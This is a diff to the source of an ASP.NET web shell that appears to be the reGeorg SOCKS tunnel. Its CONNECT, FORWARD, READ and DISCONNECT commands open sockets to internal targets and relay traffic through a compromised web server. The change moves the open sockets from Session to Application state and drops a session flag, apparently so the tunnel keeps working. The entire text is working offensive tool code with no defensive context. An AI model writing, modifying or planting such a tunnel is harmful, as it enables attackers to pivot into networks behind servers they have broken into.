@@ -42,7 +42,7 @@
                     Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     sender.Connect(remoteEP);
                     sender.Blocking = false;
-                    Session.Add(mark, sender);
+                    Application.Add(mark, sender);
                     Response.AddHeader("X-STATUS", "OK");
                 } catch (Exception ex) {
                     Response.AddHeader("X-ERROR", "Failed connecting to target");
@@ -50,13 +50,13 @@
                 }
             } else if (cmd == "DISCONNECT") {
                 try {
-                    Socket s = (Socket)Session[mark];
+                    Socket s = (Socket)Application[mark];
                     s.Close();
                 } catch (Exception ex){
                 }
-                Session.Remove(mark);
+                Application.Remove(mark);
             } else if (cmd == "FORWARD") {
-                Socket s = (Socket)Session[mark];
+                Socket s = (Socket)Application[mark];
                 try {
                     int buffLen = Request.ContentLength;
                     byte[] buff = new byte[buffLen];
@@ -72,7 +72,7 @@
                 }
             } else if (cmd == "READ") {
                 try {
-                    Socket s = (Socket)Session[mark];
+                    Socket s = (Socket)Application[mark];
                     int c = 0;
                     byte[] readBuff = new byte[513];
                     try {
@@ -91,7 +91,6 @@
                 }
             }
         } else {
-            Session["l"]=true;
             Response.Write("Georg says, 'All seems fine'");
         }
     } catch (Exception ex) {
